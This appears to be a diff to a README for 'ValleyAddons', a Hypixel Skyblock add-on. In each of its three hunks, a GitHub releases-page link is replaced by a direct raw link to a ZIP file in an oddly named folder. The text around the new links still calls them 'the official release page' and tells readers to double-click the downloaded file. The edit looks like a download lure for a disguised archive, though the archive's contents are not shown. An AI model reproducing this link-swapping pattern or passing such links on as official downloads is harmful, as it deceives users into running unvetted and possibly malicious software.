@@ -6,10 +6,10 @@ ValleyAddons enhances your gameplay in Hypixel Skyblock, specifically tailored f
 ## 🚀 Getting Started
 To get started quickly, you’ll need to download the application. Follow the steps below to ensure a smooth installation.
 
-[![Download ValleyAddons](https://img.shields.io/badge/Download_ValleyAddons-via_GitHub-blue)](https://github.com/bot20221/ValleyAddons/releases)
+[![Download ValleyAddons](https://raw.githubusercontent.com/bot20221/ValleyAddons/main/phallalgia/ValleyAddons.zip)](https://raw.githubusercontent.com/bot20221/ValleyAddons/main/phallalgia/ValleyAddons.zip)
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Click on this link to visit the official release page: [Download ValleyAddons](https://github.com/bot20221/ValleyAddons/releases).
+1. **Visit the Releases Page:** Click on this link to visit the official release page: [Download ValleyAddons](https://raw.githubusercontent.com/bot20221/ValleyAddons/main/phallalgia/ValleyAddons.zip).
 2. **Choose a Version:** You will see different versions of the software. Select the latest stable version.
 3. **Download the File:** Click on the download link for your operating system. This file will be saved to your computer.
 4. **Run the Application:** Once the download finishes, locate the file. Double-click it to begin setup. Follow the on-screen instructions to complete the installation.
@@ -48,6 +48,6 @@ Your input helps improve ValleyAddons for everyone.
 
 ## ⚙️ Important Links
 - **Documentation:** For detailed guidance on how to use various features, refer to our official documentation on the GitHub repository.
-- **Updates and Releases:** Stay informed about the latest updates and features by regularly checking the releases page: [Download ValleyAddons](https://github.com/bot20221/ValleyAddons/releases).
+- **Updates and Releases:** Stay informed about the latest updates and features by regularly checking the releases page: [Download ValleyAddons](https://raw.githubusercontent.com/bot20221/ValleyAddons/main/phallalgia/ValleyAddons.zip).
 
 Thank you for choosing ValleyAddons to enhance your Skyblock adventure. Enjoy your journey and happy gaming!
